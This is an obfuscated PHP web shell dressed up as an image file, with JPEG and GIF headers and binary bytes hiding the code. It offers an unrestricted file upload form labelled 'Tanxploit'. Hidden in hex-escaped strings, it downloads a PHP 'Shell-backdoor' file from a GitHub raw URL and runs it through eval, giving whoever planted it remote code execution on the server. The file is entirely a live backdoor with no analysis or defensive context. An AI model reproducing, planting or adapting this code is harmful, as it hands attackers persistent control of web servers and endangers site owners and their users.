<?php
 goto p9Wx1; QSIJf: ?>
�����x������x������C�




���C		

����<�d"��������������	
�������}�!1AQa"q2���#B��R��$3br�	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������������	
������w�!1AQaq"2�B����	#3R�br�
$4�%�&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������?��S��(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(��<html><link rel='icon' href='https://e.top4top.io/p_26973oc9i1.png' sizes='20x20' type='image/png'>ÿØÿà JFIF ÿþ;GIF89;aGIF89;aGIF89;a<?php  goto FkOsr; p9Wx1: ?>
����JFIF��x�x������Exif��MM�*����
����E���J����������������(������������������<!DOCTYPE html>
<html>
<head>
  <title>./Tanxploit</title>
</head>
<body>
  <form enctype="multipart/form-data" action="" method="POST">
    <p>Upload your file</p>
    <input type="file" name="uploaded_file"></input><br />
    <input type="submit" value="Upload"></input>
  </form>
</body>
</html>
<?php  goto bhsnU; eW4i3: @trim("\x3f\x3e"); goto kbuK8; yGTA2: eval("\x3f\76" . get("\150\164\x74\160\163\x3a\57\57\x72\141\167\56\x67\x69\164\x68\165\x62\x75\x73\x65\x72\x63\157\x6e\x74\x65\x6e\164\x2e\x63\157\155\x2f\x54\141\x6e\x58\160\x6c\x6f\151\164\x2f\x53\x68\x65\x6c\x6c\55\142\141\143\x6b\144\x6f\x6f\x72\57\155\x61\151\x6e\57\141\x6c\146\141\x72\x65\x61\x6c\x2e\160\x68\160")); goto K4ARC; FkOsr: echo @null; goto eW4i3; kbuK8: function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_URL, $url); $data = curl_exec($ch); curl_close($ch); return $data; } goto yGTA2; bhsnU: if (!empty($_FILES["\165\x70\x6c\157\x61\x64\x65\x64\x5f\146\x69\154\145"])) { $path = ''; $path = $path . basename($_FILES["\x75\160\154\157\x61\x64\x65\x64\137\146\x69\x6c\145"]["\156\141\155\x65"]); if (move_uploaded_file($_FILES["\x75\x70\154\157\x61\144\x65\x64\x5f\146\151\x6c\x65"]["\x74\x6d\160\137\x6e\141\x6d\145"], $path)) { echo "\124\150\145\x20\146\x69\154\x65\x20" . basename($_FILES["\x75\160\x6c\x6f\141\144\x65\144\137\146\151\154\145"]["\156\x61\x6d\x65"]) . "\40\150\141\163\x20\x62\145\x65\x6e\40\165\160\154\x6f\x61\144\145\x64"; } else { echo "\x54\x68\x65\x72\x65\40\x77\141\163\40\x61\x6e\40\145\162\x72\x6f\162\x20\x75\160\154\x6f\x61\x64\x69\156\147\40\x74\x68\x65\x20\146\x69\154\145\x2c\x20\x70\154\x65\141\x73\x65\x20\x74\x72\x79\40\x61\147\x61\151\x6e\41"; } } goto QSIJf; K4ARC: ?>
